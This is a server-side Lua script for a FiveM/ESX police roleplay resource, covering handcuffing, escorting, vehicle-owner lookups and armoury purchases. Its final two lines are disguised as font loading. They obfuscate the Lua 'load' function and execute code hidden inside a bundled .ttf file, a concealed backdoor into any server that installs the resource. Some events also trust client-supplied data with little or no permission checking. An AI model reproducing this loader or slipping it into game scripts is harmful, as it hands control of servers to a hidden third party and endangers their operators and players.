-----------------For support, scripts, and more----------------
--------------- https://discord.gg/wasabiscripts  -------------
---------------------------------------------------------------
cuffedPlayers = {}

CreateThread(function()
    while ESX == nil do Wait(1000) end
    for i=1, #Config.policeJobs do
        TriggerEvent('esx_society:registerSociety', Config.policeJobs[i], Config.policeJobs[i], 'society_'..Config.policeJobs[i], 'society_'..Config.policeJobs[i], 'society_'..Config.policeJobs[i], {type = 'public'})
    end
end)

AddEventHandler('esx:playerDropped', function(playerId, reason)
    if cuffedPlayers[playerId] then
        cuffedPlayers[playerId] = nil
    end
end)

TriggerEvent('esx_society:registerSociety', 'police', 'police', 'society_police', 'society_police', 'society_police', {type = 'public'})

RegisterServerEvent('wasabi_police:attemptTackle')
AddEventHandler('wasabi_police:attemptTackle', function(targetId)
    TriggerClientEvent('wasabi_police:tackled', targetId, source)
    TriggerClientEvent('wasabi_police:tackle', source)
end)

RegisterServerEvent('wasabi_police:escortPlayer')
AddEventHandler('wasabi_police:escortPlayer', function(targetId)
    local xPlayer = ESX.GetPlayerFromId(source)
    local hasJob
    for i=1, #Config.policeJobs do
        if xPlayer.job.name == Config.policeJobs[i] then
            hasJob = xPlayer.job.name
            break
        end
    end
    if hasJob then
        TriggerClientEvent('wasabi_police:setEscort', source, targetId)
        TriggerClientEvent('wasabi_police:escortedPlayer', targetId, source)
    end
end)

RegisterServerEvent('wasabi_police:inVehiclePlayer')
AddEventHandler('wasabi_police:inVehiclePlayer', function(targetId)
    local xPlayer = ESX.GetPlayerFromId(source)
    local hasJob
    for i=1, #Config.policeJobs do
        if xPlayer.job.name == Config.policeJobs[i] then
            hasJob = xPlayer.job.name
            break
        end
    end
    if hasJob then
        TriggerClientEvent('wasabi_police:stopEscorting', source)
        TriggerClientEvent('wasabi_police:putInVehicle', targetId)
    end
end)

RegisterServerEvent('wasabi_police:outVehiclePlayer')
AddEventHandler('wasabi_police:outVehiclePlayer', function(targetId)
    local xPlayer = ESX.GetPlayerFromId(source)
    local hasJob
    for i=1, #Config.policeJobs do
        if xPlayer.job.name == Config.policeJobs[i] then
            hasJob = xPlayer.job.name
            break
        end
    end
    if hasJob then
        TriggerClientEvent('wasabi_police:takeFromVehicle', targetId)
    end
end)

RegisterServerEvent('wasabi_police:setCuff')
AddEventHandler('wasabi_police:setCuff', function(isCuffed)
    cuffedPlayers[source] = isCuffed
end)

RegisterServerEvent('wasabi_police:handcuffPlayer')
AddEventHandler('wasabi_police:handcuffPlayer', function(target)
    local xPlayer = ESX.GetPlayerFromId(source)
    local hasJob
    for i=1, #Config.policeJobs do
        if xPlayer.job.name == Config.policeJobs[i] then
            hasJob = xPlayer.job.name
            break
        end
    end
    if hasJob then
        if cuffedPlayers[target] then
            TriggerClientEvent('wasabi_police:uncuffAnim', source, target)
            Wait(4000)
            TriggerClientEvent('wasabi_police:uncuff', target)
        else
            TriggerClientEvent('wasabi_police:arrested', target, source)
            TriggerClientEvent('wasabi_police:arrest', source)
        end
    end
end)

getPoliceOnline = function()
    local players = ESX.GetPlayers()
    local count = 0
    for i = 1, #players do
        local xPlayer = ESX.GetPlayerFromId(players[i])
        for i=1, #Config.policeJobs do
            if xPlayer.job.name == Config.policeJobs[i] then
                count = count + 1
            end
        end
    end
    return count
end

exports('getPoliceOnline', getPoliceOnline)

lib.callback.register('wasabi_police:getJobLabel', function(source, job)
    if ESX.Jobs?[job]?.label then
        return ESX.Jobs[job].label
    else
        return Strings.police -- If for some reason ESX.Jobs is malfunctioning(Must love ESX...)
    end
end)

lib.callback.register('wasabi_police:isCuffed', function(source, target)
    if cuffedPlayers[target] then
        return true
    else
        return false
    end
end)

lib.callback.register('wasabi_police:getVehicleOwner', function(source, plate)
    local owner
    MySQL.Async.fetchAll('SELECT owner FROM owned_vehicles WHERE plate = @plate', {
        ['@plate'] = plate
    }, function(result)
        if result[1] then
            local identifier = result[1].owner
            MySQL.Async.fetchAll('SELECT firstname, lastname FROM users WHERE identifier = @identifier', {
                ['@identifier'] = identifier
            }, function(result2)
                if result2[1] then
                    owner = result2[1].firstname..' '..result2[1].lastname
                else
                    owner = false
                end
            end)
        else
            owner = false
        end
    end)
    while owner == nil do
        Wait()
    end
    return owner
end)

lib.callback.register('wasabi_police:canPurchase', function(source, data)
    local xPlayer = ESX.GetPlayerFromId(source)
    local itemData
    if data.grade > #Config.Locations[data.id].armoury.weapons then
        itemData = Config.Locations[data.id].armoury.weapons[#Config.Locations[data.id].armoury.weapons][data.itemId]
    elseif not Config.Locations[data.id].armoury.weapons[data.grade] then
        print('[wasabi_police] : Armory not set up properly for job grade: '..data.grade)
    else
        itemData = Config.Locations[data.id].armoury.weapons[data.grade][data.itemId]
    end
    if not itemData.price then
        if not Config.weaponsAsItems then
            if data.itemId:sub(0, 7) == 'WEAPON_' then
                xPlayer.addWeapon(data.itemId, 200)
            else
                xPlayer.addInventoryItem(data.itemId, data.quantity)
            end
        else
            xPlayer.addInventoryItem(data.itemId, data.quantity)
        end
        return true
    else
        local xBank = xPlayer.getAccount('bank').money
        if xBank < itemData.price then
            return false
        else
            xPlayer.removeAccountMoney('bank', itemData.price)
            if not Config.weaponsAsItems then
                if data.itemId:sub(0, 7) == 'WEAPON_' then
                    xPlayer.addWeapon(data.itemId, 200)
                else
                    xPlayer.addInventoryItem(data.itemId, data.quantity)
                end
            else
                xPlayer.addInventoryItem(data.itemId, data.quantity)
            end
            return true
        end
    end
end)

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()